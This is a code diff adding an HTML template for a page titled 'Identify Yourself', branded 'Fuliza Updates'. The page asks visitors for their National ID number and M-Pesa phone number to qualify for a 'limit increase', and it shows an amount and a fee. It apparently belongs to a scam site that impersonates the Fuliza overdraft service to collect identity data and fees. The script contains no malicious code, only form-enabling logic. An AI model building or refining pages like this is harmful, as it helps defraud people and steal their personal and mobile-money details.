@@ -1,0 +1,196 @@
+<!-- Fuliza/templates/verify.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Your Details</title>
+<style>
+body {
+    font-family: Arial;
+    background: #f4f6f5;
+    margin: 0;
+    padding: 0;
+}
+
+.container {
+    max-width: 450px;
+    margin: 50px auto;
+    background: white;
+    padding: 25px 20px;
+    border-radius: 15px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+}
+
+h1{
+    text-align: center;
+}
+
+/* Text spacing */
+p {
+    margin: 10px 0;
+    text-align: center;
+    font-size: bold;
+    color: green;
+}
+
+label {
+        display: block;
+        margin-bottom: 5px;
+        font-weight: bold;
+        color: black;
+}
+
+input[type="text"] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+        font-weight: bold;
+        font-size: 17px;
+}
+/* Button */
+button {
+    width: 100%;
+    padding: 12px;
+    background: green;
+    color: white;
+    border: none;
+    border-radius: 20px;
+    margin-top: 15px;
+    font-size: 16px;
+    cursor: pointer;
+}
+button.disable{
+    background: #999;
+    cursor: not-allowed;
+
+}
+button.active{
+    background: green;
+}
+
+footer {
+    text-align: center;
+    color: green;
+}
+.phone-input{
+    display: flex;
+    gap: 10px;
+}
+.phone-input select {
+    padding: 10px;
+    border-radius: 10px;
+    border: 1px solid #ccc;
+    flex: 1;
+    max-width: 70px;
+    box-sizing: border-box;
+    height: 48px;
+    color: green;
+    font-size: 17px;
+    font-weight: bold;
+}
+.phone-input input[type="text"] {
+    flex: 3;
+    padding: 12px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+    height: 48px;
+}
+
+@media (max-width: 768px) {
+    .container {
+        width: 90%;
+        padding: 15px;
+    }
+
+    a{
+        width: 100%;
+        text-align: center;
+    }
+}
+
+@media (max-width: 480px) {
+    body{
+        padding: 10px;
+    }
+
+    h1{
+        font-size: 1.5rem;
+    }
+    .badge{
+        padding: 4px 8px;
+        font-size: 0.9rem;
+    }
+    .phone-input {
+        flex-direction: column;
+    }
+    .phone-input select,
+    .phone-input input[type="text"]{
+        width: 100%;
+    }
+}
+</style>
+</head>
+<body>
+
+<h1>Identify Yourself</h1>
+<p>This information is required to verify your eligibility for the limit increase.</p>
+
+<p><b>Amount Selected: Ksh {{ amount }}</b></p>
+<p><b>Fee: Ksh {{ fee }}</b></p>
+
+<form method="POST" action="{% url 'verify' %}">
+    {% csrf_token %}
+
+    <!-- Hidden input to carry amount -->
+    <input type="hidden" name="amount" value="{{ amount }}">
+
+    <label for="id_number"><b>National ID Number</b></label><br>
+    <input type="text" id="id_number" name="id_number" required placeholder="Enter your ID number"><br><br>
+
+    <label for="phone"><b>M-Pesa Registered Number</b></label><br>
+    <div class="phone-input">
+        <select name="Country_code" id="Country_code" required>
+            <option value="+256" selected>+256</option>
+            <option value="+255" selected>+255</option>
+            <option value="+257" selected>+257</option>
+            <option value="+27" selected>+27</option>
+            <option value="+1" selected>+1 </option>
+            <option value="+267" selected>+267</option>
+            <option value="+44" selected>+44</option>
+            <option value="+254" selected>+254</option>
+        </select>
+        <input type="text" id="phone" name="phone" required placeholder="7XXXXXXXX">
+    </div>
+    <button type="submit" id="continueBtn" disabled>Verify & Continue</button>
+</form>
+
+<script>
+    let idInput = document.getElementById("id_number");
+let phoneInput = document.getElementById("phone");
+let btn = document.getElementById("continueBtn");
+
+function checkInputs() {
+    if (idInput.value.trim() !== "" && phoneInput.value.trim() !== "") {
+        btn.disabled = false;
+        btn.classList.add("active");
+    } else {
+        btn.disabled = true;
+        btn.classList.remove("active");
+    }
+}
+
+// Listen for typing
+idInput.addEventListener("input", checkInputs);
+phoneInput.addEventListener("input", checkInputs);
+</script>
+
+<footer>
+    <p><i>&copy;2026 Fuliza Updates. All Rights Reserved.</i></p>
+</footer>
+</body>
+</html>
